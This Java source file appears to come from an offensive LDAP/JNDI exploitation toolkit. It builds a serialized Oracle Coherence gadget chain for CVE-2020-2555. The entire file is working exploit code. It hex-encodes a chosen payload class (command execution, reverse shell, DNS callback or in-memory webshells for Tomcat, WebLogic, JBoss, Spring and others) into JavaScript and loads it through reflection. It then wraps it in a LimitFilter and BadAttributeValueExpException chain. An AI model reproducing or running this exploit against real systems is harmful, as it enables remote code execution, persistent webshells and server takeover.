package com.feihong.ldap.gadgets;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.ClassFiles;
import com.feihong.ldap.template.*;
import com.feihong.ldap.utils.Cache;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.apache.tomcat.util.buf.HexUtils;

import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngineManager;;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class CVE_2020_2555 {
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {

        String className;
        switch (type){
            case command:
                CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(param[0]);
                dnslogTemplate.cache();
                className = dnslogTemplate.getClassName();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(param[0], param[1]);
                reverseShellTemplate.cache();
                className = reverseShellTemplate.getClassName();
                break;
            case tomcatecho:
                className = TomcatEchoTemplate.class.getName();
                break;
            case springecho:
                className = SpringEchoTemplate.class.getName();
                break;
            case weblogicecho:
                className = WeblogicEchoTemplate.class.getName();
                break;
            case tomcatmemshell1:
                className = TomcatMemshellTemplate1.class.getName();
                break;
            case tomcatmemshell2:
                className = TomcatMemshellTemplate2.class.getName();
                break;
            case jettymemshell:
                className = JettyMemshellTemplate.class.getName();
                break;
            case jbossmemshell:
                className = JBossMemshellTemplate.class.getName();
                break;
            case weblogicmemshell1:
                className = WeblogicMemshellTemplate1.class.getName();
                break;
            case weblogicmemshell2:
                className = WeblogicMemshellTemplate2.class.getName();
                break;
            case webspherememshell:
                className = WebsphereMemshellTemplate.class.getName();
                break;
            case springmemshell:
                className = SpringMemshellTemplate.class.getName();
                break;
            default:
                throw new IllegalStateException("Unexpected value: " + type);
        }


        byte[] bytes = Cache.get(className);
        if(bytes == null){
            String shortName = className.substring(className.lastIndexOf(".") + 1);
            bytes =  Cache.get(shortName);
        }
        String classCode = HexUtils.toHexString(bytes);

        String code = "var hex = '" + classCode + "';\n" +
                "hex = hex.length() % 2 != 0 ? \"0\" + hex : hex;\n" +
                "var b = new java.io.ByteArrayOutputStream();\n" +
                "for (var i = 0; i < hex.length() / 2; i++) {\n" +
                "   var index = i * 2;\n" +
                "   var v = java.lang.Integer.parseInt(hex.substring(index, index + 2), 16);\n" +
                "   b.write(v);\n" +
                "};\n" +
                "b.close();   \n" +
                "var bytes = b.toByteArray();   \n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + className + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "}";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(badAttributeValueExpException);
        bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
